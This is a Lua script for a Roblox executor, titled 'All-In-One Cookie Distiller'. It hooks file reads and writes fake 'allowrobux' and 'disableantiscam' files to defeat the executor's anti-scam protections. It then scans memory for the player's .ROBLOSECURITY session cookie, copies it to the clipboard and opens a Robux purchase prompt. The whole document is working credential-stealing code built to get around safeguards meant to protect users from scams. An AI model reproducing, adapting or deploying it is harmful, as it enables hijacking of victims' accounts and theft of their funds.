-- [[ Project: All-In-One Cookie Distiller ]]
-- 1. Security Bypass (AntiScam & AllowRobux)
-- 2. Performance Optimized Capture
-- 3. Auto-Trigger UI

local function log(msg) print("[SYSTEM] " .. tostring(msg)) end

local player = game:GetService("Players").LocalPlayer
local userId = tostring(player.UserId)
local MS = game:GetService("MarketplaceService")

-- 画像[セキュ_2.png]の仕様に基づいた共通設定データ
local config_raw = game:GetService("HttpService"):JSONEncode({
    ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
    ["allowed_games"] = "*",
    ["user_id"] = userId,
    ["version_num"] = 707
})

-- ==========================================
-- STEP 1: 保護機能の完全無効化 (Bypass)
-- ==========================================
pcall(function()
    -- ファイル読み込み時のフック
    local old_read
    old_read = hookfunction(readfile, function(path)
        local p = path:lower()
        if string.find(p, "allowrobux") or string.find(p, "disableantiscam") or string.find(p, "allowteleports") then
            return config_raw
        end
        return old_read(path)
    end)
    
    -- 物理ファイルの作成 (Deltaの仕様に合わせる)
    writefile("allowrobux", config_raw)
    writefile("disableantiscam", config_raw)
    log("Protections Bypassed.")
end)

-- ==========================================
-- STEP 2: 超軽量クッキー抽出ロジック
-- ==========================================
local function start_capture()
    task.spawn(function()
        local target_prefix = "_|WARNING:-DO-NOT-SHARE-"
        log("Scanning for session data...")
        
        while true do
            -- getgc()で文字列だけを効率的にチェック
            for _, v in pairs(getgc()) do
                if type(v) == "string" and #v > 500 then
                    if string.find(v, target_prefix, 1, true) then
                        local _, pos = string.find(v, "|_", 1, true)
                        if pos then
                            setclipboard(string.sub(v, pos + 1))
                            print("********************************")
                            print("SUCCESS: Captured to clipboard!")
                            print("********************************")
                            return 
                        end
                    end
                end
            end
            task.wait(5)
        end
    end)
end

-- ==========================================
-- STEP 3: 実行開始
-- ==========================================
start_capture()
task.wait(2)

log("Opening UI for authentication...")
pcall(function()
    -- allowrobuxが有効なら、これで画面が出るはずだ
    MS:PromptProductPurchase(player, 0)
end)

log("Ready. If the screen is black, wait 10 seconds.")
